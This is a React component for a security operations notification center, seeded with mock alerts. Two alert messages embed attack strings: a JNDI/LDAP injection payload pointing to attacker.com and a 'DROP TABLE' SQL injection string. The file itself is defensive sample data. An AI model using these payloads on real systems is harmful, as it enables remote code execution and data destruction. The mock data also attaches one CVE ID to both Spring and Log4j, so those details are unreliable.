import React, { useState, useRef, useEffect } from 'react';
import { Bell, X, Check, AlertTriangle, Info, AlertCircle, Clock, Globe, Network, Cog } from 'lucide-react';

interface Notification {
  id: string;
  type: 'web-threat' | 'network-threat' | 'alert' | 'info' | 'warning' | 'task' | 'system';
  title: string;
  message: string;
  time: string;
  read: boolean;
  severity: 'critical' | 'high' | 'medium' | 'low' | 'info';
  source?: string;
  action?: () => void;
}

interface NotificationCenterProps {
  darkMode: boolean;
}

const NotificationCenter: React.FC<NotificationCenterProps> = ({ darkMode }) => {
  const [isOpen, setIsOpen] = useState(false);
  const [activeTab, setActiveTab] = useState<string>('all');
  const [notifications, setNotifications] = useState<Notification[]>([
    // Web Application Security
    {
      id: 'web-1',
      type: 'web-threat',
      title: '🚨 CRITICAL: Zero-Day Exploit Attempt',
      message: 'CVE-2023-32456 (CVSS: 9.8) - Remote Code Execution in Spring Framework detected on /api/v1/user. Payload: ${jndi:ldap://attacker.com/exploit}',
      time: '2 min ago',
      read: false,
      severity: 'critical',
      source: 'WAF (ModSecurity)',
      action: () => console.log('View exploit details and affected endpoints')
    },
    {
      id: 'web-2',
      type: 'web-threat',
      title: '⚠️ SQL Injection Attempt Blocked',
      message: 'Blocked SQLi attack pattern "1=1; DROP TABLE users--" in login form from IP 192.168.1.45 (UA: sqlmap/1.6)',
      time: '5 min ago',
      read: false,
      severity: 'high',
      source: 'ModSecurity',
      action: () => console.log('View attack details and block IP')
    },
    
    // Network Security
    {
      id: 'net-1',
      type: 'network-threat',
      title: '🔍 Suspicious Port Scanning',
      message: 'Detected from 185.220.101.134 (TOR exit node, AS9009) - Scanned 45 ports in 2 minutes (22,80,443,3389,5985,5986)',
      time: '8 min ago',
      read: false,
      severity: 'medium',
      source: 'Suricata IDS',
      action: () => console.log('View full scan report')
    },
    {
      id: 'net-2',
      type: 'network-threat',
      title: '🛡️ DDoS Mitigation Active',
      message: 'Mitigating 12.5 Gbps SYN flood attack from botnet (45.133.1.0/24, AS12345) - 95% traffic blocked',
      time: '15 min ago',
      read: true,
      severity: 'high',
      source: 'Cloudflare',
      action: () => console.log('View DDoS analytics and traffic patterns')
    },
    
    // Authentication & Access
    {
      id: 'auth-1',
      type: 'alert',
      title: '🔐 Unusual Login Activity',
      message: 'New login detected for admin@company.com from Chrome 114 on Windows 11 (New York, US - IP: 192.0.2.1) - VPN: ExpressVPN',
      time: '5 min ago',
      read: false,
      severity: 'medium',
      source: 'Okta MFA',
      action: () => console.log('Review login details and verify session')
    },
    {
      id: 'auth-2',
      type: 'alert',
      title: '🚫 Brute Force Attempt Blocked',
      message: '15 failed login attempts in 2 minutes for admin@example.com from 45.227.253.109 (Russia, AS12389) - Account locked for 30 minutes',
      time: '12 min ago',
      read: false,
      severity: 'high',
      source: 'CrowdStrike',
      action: () => console.log('View authentication logs and IP reputation')
    },
    
    // System & Infrastructure
    {
      id: 'sys-1',
      type: 'system',
      title: '🔧 Critical Security Patch Available',
      message: 'CVE-2023-32456 (CVSS: 9.8) - Remote Code Execution in Apache Log4j 2.0-beta9 through 2.15.0 - Patch immediately',
      time: '1 hour ago',
      read: true,
      severity: 'high',
      source: 'Qualys VMDR',
      action: () => console.log('View patch details and affected systems')
    },
    {
      id: 'sys-2',
      type: 'system',
      title: '⚙️ Unauthorized Configuration Change',
      message: 'Firewall rule modified by admin@example.com outside maintenance window - Added ALLOW 0.0.0.0/0:22 (SSH) to DMZ',
      time: '45 min ago',
      read: false,
      severity: 'high',
      source: 'Terraform Cloud',
      action: () => console.log('Review change details and rollback if needed')
    },
    
    // Threat Intelligence
    {
      id: 'ti-1',
      type: 'alert',
      title: '📡 New IOCs Detected',
      message: '3 malicious IPs from AlienVault OTX matched in logs - 2 C2 servers, 1 malware distribution point - 5 internal systems communicated',
      time: '30 min ago',
      read: false,
      severity: 'high',
      source: 'MISP',
      action: () => console.log('View IOC details and affected systems')
    },
    
    // Compliance
    {
      id: 'comp-1',
      type: 'task',
      title: '📋 PCI DSS v4.0 Assessment Due',
      message: 'Quarterly assessment starts in 7 days - 3 controls need attention (Password Policy, MFA, Log Retention)',
      time: '3 hours ago',
      read: true,
      severity: 'medium',
      source: 'Drata',
      action: () => console.log('View compliance dashboard and remediation tasks')
    },
    
    // Endpoint Security
    {
      id: 'ep-1',
      type: 'alert',
      title: '🦠 Malware Detected & Contained',
      message: 'Trojan:Win32/Wacatac.B!ml detected on WS-EXEC-0142 (192.168.1.42) - File: C:/temp/setup.exe - SHA256: a1b2c3... - Auto-contained',
      time: '1 hour ago',
      read: false,
      severity: 'critical',
      source: 'CrowdStrike EDR',
      action: () => console.log('View containment details and forensic data')
    },
    
    // Data Protection
    {
      id: 'dp-1',
      type: 'alert',
      title: '📤 Potential Data Exfiltration',
      message: '2.4GB of sensitive data (PII, source code) uploaded to external cloud storage (account: user@external.com) - 3 policy violations detected',
      time: '20 min ago',
      read: false,
      severity: 'high',
      source: 'Microsoft Purview',
      action: () => console.log('Investigate data transfer and user activity')
    }
  ]);

  const notificationRef = useRef<HTMLDivElement>(null);
  const unreadCount = notifications.filter(n => !n.read).length;

  useEffect(() => {
    const handleClickOutside = (event: MouseEvent) => {
      if (notificationRef.current && !notificationRef.current.contains(event.target as Node)) {
        setIsOpen(false);
      }
    };

    if (isOpen) {
      document.addEventListener('mousedown', handleClickOutside);
    }

    return () => {
      document.removeEventListener('mousedown', handleClickOutside);
    };
  }, [isOpen]);

  const removeNotification = (id: string, e: React.MouseEvent) => {
    e.stopPropagation(); // Prevent event bubbling
    setNotifications(notifications.filter(notification => notification.id !== id));
  };

  const handleNotificationClick = (notification: Notification) => {
    if (notification.action) {
      notification.action();
    }
    // Mark as read on click
    setNotifications(notifications.map(n => 
      n.id === notification.id ? { ...n, read: true } : n
    ));
  };

  const markAllAsRead = (e: React.MouseEvent) => {
    e.stopPropagation();
    setNotifications(notifications.map(notification => ({
      ...notification,
      read: true
    })));
  };

  const clearAllNotifications = () => {
    setNotifications([]);
  };

  const getNotificationIcon = (notification: Notification) => {
    // First check the notification type
    switch (notification.type) {
      case 'web-threat':
        return <Globe className="h-4 w-4 text-orange-500" />;
      case 'network-threat':
        return <Network className="h-4 w-4 text-red-500" />;
      case 'alert':
        return <AlertCircle className="h-4 w-4 text-yellow-500" />;
      case 'warning':
        return <AlertTriangle className="h-4 w-4 text-amber-500" />;
      case 'info':
        return <Info className="h-4 w-4 text-blue-500" />;
      case 'task':
        return <Check className="h-4 w-4 text-green-500" />;
      case 'system':
        return <Cog className="h-4 w-4 text-purple-500" />;
      default:
        return <Info className="h-4 w-4 text-gray-500" />;
    }
  };

  const getSeverityBadge = (severity: string) => {
    const baseClasses = 'inline-flex items-center px-2 py-0.5 rounded text-xs font-medium';
    
    switch (severity) {
      case 'critical':
        return <span className={`${baseClasses} bg-red-100 text-red-800 dark:bg-red-900 dark:text-red-200`}>Critical</span>;
      case 'high':
        return <span className={`${baseClasses} bg-orange-100 text-orange-800 dark:bg-orange-900 dark:text-orange-200`}>High</span>;
      case 'medium':
        return <span className={`${baseClasses} bg-yellow-100 text-yellow-800 dark:bg-yellow-900 dark:text-yellow-200`}>Medium</span>;
      case 'low':
        return <span className={`${baseClasses} bg-blue-100 text-blue-800 dark:bg-blue-900 dark:text-blue-200`}>Low</span>;
      case 'info':
      default:
        return <span className={`${baseClasses} bg-gray-100 text-gray-800 dark:bg-gray-700 dark:text-gray-200`}>Info</span>;
    }
  };

  const filteredNotifications = activeTab === 'all' 
    ? notifications 
    : activeTab === 'threats'
      ? notifications.filter(n => n.type === 'web-threat' || n.type === 'network-threat')
      : notifications.filter(n => n.type === activeTab);

  return (
    <div className="relative" ref={notificationRef}>
      <button
        onClick={() => setIsOpen(!isOpen)}
        className="relative p-1 rounded-full focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500"
        aria-label="Notifications"
      >
        <Bell className="h-5 w-5" />
        {unreadCount > 0 && (
          <span className="absolute -top-1 -right-1 bg-red-500 text-white text-xs rounded-full h-4 w-4 flex items-center justify-center">
            {unreadCount}
          </span>
        )}
      </button>

      {isOpen && (
        <div className={`absolute right-0 mt-2 w-80 rounded-md shadow-lg z-50 ${
          darkMode ? 'bg-gray-800 text-white border border-gray-700' : 'bg-white text-gray-900 border border-gray-200'
        }`}>
          <div className={`px-4 py-3 border-b ${
            darkMode ? 'border-gray-700' : 'border-gray-100'
          } flex justify-between items-center`}>
            <h3 className="text-sm font-medium">Notifications</h3>
            <div className="flex space-x-2">
              <div className="flex space-x-4">
                <button 
                  onClick={markAllAsRead}
                  className={`text-xs ${
                    darkMode ? 'text-blue-400 hover:text-blue-300' : 'text-blue-600 hover:text-blue-800'
                  }`}
                >
                  Mark all as read
                </button>
                <button 
                  onClick={(e) => {
                    e.stopPropagation();
                    clearAllNotifications();
                  }}
                  className={`text-xs ${
                    darkMode ? 'text-red-400 hover:text-red-300' : 'text-red-600 hover:text-red-800'
                  }`}
                >
                  Clear all
                </button>
              </div>
              <button 
                onClick={() => setIsOpen(false)}
                className="text-gray-400 hover:text-gray-500"
              >
                <X className="h-4 w-4" />
              </button>
            </div>
          </div>

          {/* Notification tabs */}
          <div className={`flex border-b ${
            darkMode ? 'border-gray-700' : 'border-gray-100'
          }`}>
            {['all', 'threats', 'alert', 'task', 'system'].map((tab) => (
              <button
                key={tab}
                onClick={() => setActiveTab(tab)}
                className={`flex-1 py-2 text-xs font-medium ${
                  activeTab === tab
                    ? darkMode
                      ? 'text-blue-400 border-b-2 border-blue-500'
                    : 'text-blue-600 border-b-2 border-blue-500'
                    : darkMode
                    ? 'text-gray-400 hover:text-gray-300'
                    : 'text-gray-500 hover:text-gray-700'
                }`}
              >
                {tab === 'threats' ? 'Threats' : tab.charAt(0).toUpperCase() + tab.slice(1)}
                {tab === 'all' && unreadCount > 0 && (
                  <span className="ml-1 px-1.5 py-0.5 text-xs rounded-full bg-red-500 text-white">
                    {unreadCount}
                  </span>
                )}
              </button>
            ))}
          </div>

          {/* Notification list */}
          <div className="max-h-96 overflow-y-auto">
            {filteredNotifications.length > 0 ? (
              <ul className="divide-y divide-gray-200 dark:divide-gray-700">
                {filteredNotifications.map((notification) => (
                  <li 
                    key={notification.id} 
                    className={`px-4 py-3 cursor-pointer transition-colors ${
                      darkMode ? 'hover:bg-gray-700' : 'hover:bg-gray-50'
                    } ${!notification.read ? (darkMode ? 'bg-gray-700' : 'bg-blue-50') : ''}`}
                    onClick={() => handleNotificationClick(notification)}
                  >
                    <div className="flex items-start">
                      <div className="flex-shrink-0 pt-0.5">
                        {getNotificationIcon(notification)}
                      </div>
                      <div className="ml-3 flex-1">
                        <div className="flex items-center justify-between">
                          <p className={`text-sm font-medium ${
                            darkMode ? 'text-white' : 'text-gray-900'
                          }`}>
                            {notification.title}
                          </p>
                          {getSeverityBadge(notification.severity)}
                        </div>
                        {notification.source && (
                          <p className="text-xs text-gray-400 mt-0.5">
                            Source: {notification.source}
                          </p>
                        )}
                        <p className="text-sm text-gray-500">
                          {notification.message}
                        </p>
                        <div className="mt-1 flex items-center text-xs text-gray-400">
                          <Clock className="h-3 w-3 mr-1" />
                          {notification.time}
                        </div>
                      </div>
                      <div className="ml-4 flex-shrink-0" onClick={(e) => e.stopPropagation()}>
                        <button
                          onClick={(e) => {
                            e.stopPropagation();
                            removeNotification(notification.id, e);
                          }}
                          className="text-gray-400 hover:text-red-500 transition-colors p-1 -mr-1"
                          aria-label="Remove notification"
                          title="Remove notification"
                        >
                          <X className="h-4 w-4" />
                        </button>
                      </div>
                    </div>
                  </li>
                ))}
              </ul>
            ) : (
              <div className="py-6 text-center">
                <Bell className="mx-auto h-8 w-8 text-gray-400" />
                <p className="mt-2 text-sm text-gray-500">No notifications</p>
              </div>
            )}
          </div>

          <div className={`px-4 py-2 border-t ${
            darkMode ? 'border-gray-700' : 'border-gray-100'
          } text-center`}>
            <a
              href="#"
              className={`text-xs font-medium ${
                darkMode ? 'text-blue-400 hover:text-blue-300' : 'text-blue-600 hover:text-blue-800'
              }`}
            >
              View all notifications
            </a>
          </div>
        </div>
      )}
    </div>
  );
};

export default NotificationCenter;
